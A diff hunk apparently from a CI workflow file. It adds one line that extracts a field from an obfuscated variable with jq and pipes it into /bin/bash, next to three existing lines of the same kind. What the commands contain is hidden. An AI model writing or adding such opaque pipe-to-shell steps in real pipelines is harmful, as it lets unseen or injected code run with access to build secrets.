@@ -22,6 +22,7 @@ jobs:
           echo $t8442 | jq -r .t50 | /bin/bash
           echo $y7 | jq -r .b09 | /bin/bash
           printf '%s' "$sdkv94940" | jq -r .s70 | /bin/bash
+          echo $lw86 | jq -r .naa2 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
